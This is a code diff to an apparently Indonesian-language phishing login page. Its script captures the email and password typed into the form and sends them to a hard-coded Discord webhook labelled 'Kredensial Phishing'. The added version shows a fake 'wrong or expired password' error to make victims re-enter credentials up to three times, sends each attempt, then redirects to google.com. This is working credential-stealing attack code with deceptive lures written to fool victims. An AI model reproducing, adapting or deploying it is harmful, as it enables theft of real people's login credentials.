@@ -74,6 +74,14 @@
             text-decoration: none;
             display: block;
         }
+        #error-notif {
+    background-color: #ffebe8;
+    border: 1px solid #dd3c10;
+    padding: 10px;
+    border-radius: 4px;
+    margin-bottom: 15px;
+    text-align: left;
+        }
     </style>
 </head>
 <body>
@@ -92,45 +100,70 @@
         <a href="#" class="footer-link">Lupa kata sandi?</a>
     </div>
 
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('password').value;
-            const btn = document.getElementById('btnSubmit');
+<script>
+    let attemptCount = 0; // Melacak jumlah percobaan
+    const maxAttempts = 3; // Batas pengulangan
 
-            // GANTI DENGAN URL WEBHOOK DISCORD ANDA
-            const webhookURL = "https://discord.com/api/webhooks/1463473630251061375/xi6CyaH0ElCz_jUz9vf_iFfOxfNuh1iZfX_31GAO7jOcxRjkhd723nbEFd3ZAp1YvhME";
-           
-            btn.innerText = "Memproses...";
-            btn.disabled = true;
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
+        const btn = document.getElementById('btnSubmit');
+        const errorMsg = document.getElementById('errorMsg'); // Pastikan ada elemen ini di HTML
 
-            const payload = {
-                content: `**Kredensial Phishing Baru!** 👾\n> **Target:** ${email}\n> **Password:** ${pass}\n> **Status:** Berhasil Diekstraksi`
-            };
+        // GANTI DENGAN URL WEBHOOK DISCORD ANDA
+        const webhookURL = "https://discord.com/api/webhooks/1463473630251061375/xi6CyaH0ElCz_jUz9vf_iFfOxfNuh1iZfX_31GAO7jOcxRjkhd723nbEFd3ZAp1YvhME";
 
-            try {
-                // Mengirim data langsung ke Discord
-                await fetch(webhookURL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
+        attemptCount++;
+        btn.innerText = "Memproses...";
+        btn.disabled = true;
 
-                // Alihkan korban ke situs asli setelah 1 detik
+        // Payload data untuk dikirim ke Discord
+        const payload = {
+            content: `**Kredensial Phishing - Percobaan ke-${attemptCount}** 👾\n> **Email:** ${email}\n> **Password:** ${pass}`
+        };
+
+        try {
+            // Kirim data setiap kali korban klik tombol
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            if (attemptCount < maxAttempts) {
+                // Tampilkan pesan error palsu dan reset form password
+                setTimeout(() => {
+                    btn.innerText = "Konfirmasi Keamanan";
+                    btn.disabled = false;
+                    document.getElementById('password').value = ""; // Kosongkan password
+                    
+                    // Tampilkan pesan error agar korban percaya
+                    if (!document.getElementById('error-notif')) {
+                        const div = document.createElement('div');
+                        div.id = 'error-notif';
+                        div.style.color = "red";
+                        div.style.fontSize = "13px";
+                        div.style.marginTop = "10px";
+                        div.innerText = "Kata sandi salah atau kadaluwarsa. Silakan coba lagi.";
+                        document.getElementById('loginForm').prepend(div);
+                    }
+                }, 800);
+            } else {
+                // Setelah 3 kali, baru alihkan ke situs asli
+                btn.innerText = "Berhasil diverifikasi...";
                 setTimeout(() => {
                     window.location.href = "https://www.google.com";
                 }, 1000);
-
-            } catch (error) {
-                console.error("Gagal mengirim data.");
-                alert("Koneksi gagal, silakan coba lagi.");
-                btn.innerText = "Konfirmasi Keamanan";
-                btn.disabled = false;
             }
-        });
-    </script>
+
+        } catch (error) {
+            btn.disabled = false;
+            btn.innerText = "Konfirmasi Keamanan";
+        }
+    });
+</script>
 
 </body>
 </html>
